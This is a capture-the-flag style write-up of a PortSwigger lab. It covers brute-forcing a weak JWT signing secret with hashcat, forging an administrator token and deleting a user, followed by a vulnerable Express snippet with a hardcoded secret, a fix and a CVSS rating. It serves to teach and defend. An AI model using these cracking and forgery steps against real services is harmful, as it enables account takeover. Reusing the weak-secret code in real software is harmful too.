# Article 2: Brute-Forcing Weak JWT Secrets

> This is **Article 2 of 4** in a series of articles about JWT vulnerabilities, based on labs from [PortSwigger Web Security Academy](https://portswigger.net/web-security/jwt).

**Labs covered:**
- Lab 3: JWT authentication bypass via weak signing key

---

# About this article

All examples, requests, and exploitation steps are based on real lab walkthrough.

In the previous article we looked at servers that fail to verify JWT signatures at all. This time we assume the server **does** verify signatures — but it uses a **weak, guessable secret key**, which turns out to be just as dangerous.

---

## 1. How JWT Secrets Work

### 1.1 Symmetric signing (HS256)

Algorithms such as **HS256** (HMAC + SHA-256) use an **arbitrary, standalone string** as the secret key. The same secret is used to **sign** and to **verify** the token.

Just like a password, this secret must be:
- Long
- Random
- Unpredictable

If an attacker can guess or brute-force it, they can **forge any token** and sign it with a valid signature.

### 1.2 Why developers introduce weak secrets

Common mistakes:

- Forgetting to change a **default or placeholder** secret.
- Copy-pasting code snippets from online examples and leaving the **hardcoded secret** unchanged.
- Using a short, dictionary-based word as the secret.

In these cases, the secret can be trivially brute-forced using a wordlist of well-known secrets, for example [`jwt.secrets.list`](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list).

### 1.3 The attack recipe

To brute-force a server's secret, an attacker needs only:

1. A valid, signed JWT from the target server.
2. A wordlist of common secrets.

Hashcat signs the `header.payload` from the JWT with each secret in the wordlist, then compares the resulting signature with the original. If any match — the secret is identified.

---

## 2. Lab 3: JWT authentication bypass via weak signing key

### 2.1 Lab Description

> This lab uses a JWT-based mechanism for handling sessions. It uses an extremely weak secret key to both sign and verify tokens. This can be easily brute-forced using a wordlist of common secrets.
>
> **Goal:** First brute-force the website's secret key. Once obtained, use it to sign a modified session token that gives you access to the admin panel at `/admin`, then delete the user `carlos`.
>
> **Credentials:** `wiener:peter`

### 2.2 Exploitation Walkthrough

#### Step 1 — Obtain a valid session token

Log in with `wiener:peter` to receive a legitimate JWT session cookie.

**Request:**

```http
POST /login HTTP/1.1
Host: 0af700e303c5213a827e1fc400fb006d.web-security-academy.net
Connection: keep-alive
Content-Length: 68
Cache-Control: max-age=0
sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Origin: https://0af700e303c5213a827e1fc400fb006d.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0af700e303c5213a827e1fc400fb006d.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
Cookie: session=

csrf=wAupcjnyUjq8OmJKWJYGdctzgCLT9sgq&username=wiener&password=peter
```

**Response:**

```http
HTTP/1.1 302 Found
Location: /my-account?id=wiener
Set-Cookie: session=eyJraWQiOiI4ZWUwZjlmYy0yYmY4LTQzNDktYTZkNC0wZjM2Yzk1ZmIwZDciLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4ODI5NjkzNywic3ViIjoid2llbmVyIn0.jSdwrVtxyuyp17iSHojlISsdMHqldrQ68eR7Qu5rB9I; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Encoding: gzip
Connection: close
Content-Length: 0
```

The captured session token:

```
eyJraWQiOiI4ZWUwZjlmYy0yYmY4LTQzNDktYTZkNC0wZjM2Yzk1ZmIwZDciLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4ODI5NjkzNywic3ViIjoid2llbmVyIn0.jSdwrVtxyuyp17iSHojlISsdMHqldrQ68eR7Qu5rB9I
```

#### Step 2 — Analyze the token

Decode the header to identify the signing algorithm. The third segment (after the last dot) is the signature produced with the server's secret key.

```json
{
  "kid": "8ee0f9fc-2bf8-4349-a6d4-0f36c95fb0d7",
  "alg": "HS256"
}
```

`HS256` means **HMAC + SHA-256** — a symmetric algorithm that uses a standalone secret.

![[Articles/JWT Articles/Article 2/lab_3/Screenshot_20260901_161336.png]]

#### Step 3 — Prepare hashcat

JWT hashes have a specific hashcat mode. Verify the correct mode ID:

```sh
hashcat --help | grep JWT
# 16500 | JWT (JSON Web Token)
```

Save the token to a file for hashcat:

```sh
echo "eyJraWQiOiI4ZWUwZjlmYy0yYmY4LTQzNDktYTZkNC0wZjM2Yzk1ZmIwZDciLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4ODI5NjkzNywic3ViIjoid2llbmVyIn0.jSdwrVtxyuyp17iSHojlISsdMHqldrQ68eR7Qu5rB9I" > secret-jwt.txt
```

#### Step 4 — Brute-force the secret

![[Articles/JWT Articles/Article 2/lab_3/Screenshot_20260901_162909.png]]

Run hashcat against the wordlist:

```sh
# -a 0      dictionary attack
# -m 16500  JWT (JSON Web Token)
# -w 3      high GPU workload (faster)
# -D 2      use GPU instead of CPU
# -O        optimized GPU kernels
```


```sh
hashcat -a 0 -m 16500 -w 3 -D 2 -O secret-jwt.txt /path/to/jwt.secrets.list
```

```sh
# If no GPU is available (CPU only) — drop -D 2:

hashcat -a 0 -m 16500 -w 3 secret-jwt.txt /path/to/jwt.secrets.list
```

The identified secret in this lab was **`secret1`** — the exact string used to sign the token.

#### Step 5 — Forge a new token with `sub: administrator`

Now that the secret is known, re-sign a modified token with `sub: administrator` using `secret1` as the HMAC key.

![[Articles/JWT Articles/Article 2/lab_3/Screenshot_20260901_163236.png]]

The forged token:

```
eyJraWQiOiJhOWFmMGZhYS1jYjZhLTRlM2ItOTkyMi02ZDNhN2E3ZDNhYTQiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4ODI5ODYzMSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.bW7XaHOWjbYAdPeZK0xMZg5tYKFNqAqoYcIPY82Ixic
```

#### Step 6 — Access `/admin`

```http
GET /admin HTTP/1.1
Host: 0a9d006503ffc1ea829f6197006200ab.web-security-academy.net
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Referer: https://0a9d006503ffc1ea829f6197006200ab.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
Cookie: session=eyJraWQiOiJhOWFmMGZhYS1jYjZhLTRlM2ItOTkyMi02ZDNhN2E3ZDNhYTQiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4ODI5ODYzMSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.bW7XaHOWjbYAdPeZK0xMZg5tYKFNqAqoYcIPY82Ixic
```

**Response — 200 OK, admin access granted:**

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 3230
```

![[Articles/JWT Articles/Article 2/lab_3/Screenshot_20260901_163904.png]]

#### Step 7 — Delete the user `carlos`

```http
GET /admin/delete?username=carlos HTTP/1.1
Host: 0a9d006503ffc1ea829f6197006200ab.web-security-academy.net
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Referer: https://0a9d006503ffc1ea829f6197006200ab.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
Cookie: session=eyJraWQiOiJhOWFmMGZhYS1jYjZhLTRlM2ItOTkyMi02ZDNhN2E3ZDNhYTQiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4ODI5ODYzMSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.bW7XaHOWjbYAdPeZK0xMZg5tYKFNqAqoYcIPY82Ixic
```

**Responses** — redirect followed by success:

```http
HTTP/1.1 302 Found
Location: /admin
X-Frame-Options: SAMEORIGIN
Content-Encoding: gzip
Connection: close
Content-Length: 0
```

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 6241
```

![[Articles/JWT Articles/Article 2/lab_3/Screenshot_20260901_164204.png]]

---

## 3. Vulnerable Node.js Express Code

```js
const jwt = require('jsonwebtoken');
const express = require('express');
const app = express();

// BUG: a weak, hardcoded secret. Attackers can brute-force it with
// a wordlist (e.g. hashcat -m 16500) and then forge any token.
const SECRET = 'secret1';   // guessable placeholder secret

app.get('/admin', (req, res) => {
  const token = req.cookies.session;

  const decoded = jwt.verify(token, SECRET, { algorithms: ['HS256'] });

  if (decoded.sub === 'administrator') {
    res.send('Admin panel');
  } else {
    res.send('Forbidden');
  }
});
```

**Why it's vulnerable:** the secret is short, hardcoded, and dictionary-based. An attacker with a valid JWT can brute-force `SECRET` offline (hashcat, mode 16500), then sign a forged token with `sub: administrator`.

### 3.1 Fix

```js
const crypto = require('crypto');
const jwt = require('jsonwebtoken');
const express = require('express');
const app = express();

// For HS256, use a strong random secret with at least 256 bits of entropy.
// Example generation: crypto.randomBytes(32).toString('hex')
const SECRET = process.env.JWT_SECRET;

app.get('/admin', (req, res) => {
  const token = req.cookies.session;
  const decoded = jwt.verify(token, SECRET, { algorithms: ['HS256'] });

  if (decoded.sub === 'administrator') {
    res.send('Admin panel');
  } else {
    res.send('Forbidden');
  }
});
```

---

## 4. CVSS Score

The vulnerability is an **authentication bypass** via a brute-forced signing secret, leading to privilege escalation and account takeover.

### CVSS v3.1 Vector

```
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
```

| Metric | Value | Explanation |
|---|---|---|
| **AV** | Network (N) | Exploited remotely over HTTP |
| **AC** | Low (L) | Requires only a valid JWT and a wordlist |
| **PR** | Low (L) | Needs a low-privileged account (`wiener`) |
| **UI** | None (N) | No user interaction required |
| **S** | Unchanged (U) | Impact stays within the affected component |
| **C / I / A** | High (H) | Full admin takeover, privilege escalation |

**Base Score: 8.8 (High)**

### Explanation

The secret can be brute-forced offline with no special conditions, and the attacker gains full administrative control (high impact on confidentiality, integrity, and availability). Because a valid low-privileged account is required, the score is **8.8 High**.

---

## 5. Key Takeaways

| #   | Lesson                                                                                |
| --- | ------------------------------------------------------------------------------------- |
| 1   | HS256 secrets must be **long, random, and unpredictable** — treat them like passwords |
| 2   | Never use default/placeholder/hardcoded secrets in production                         |
| 3   | Weak secrets can be brute-forced offline with `hashcat -m 16500`                      |
| 4   | Once the secret is known, the entire JWT mechanism is compromised                     |
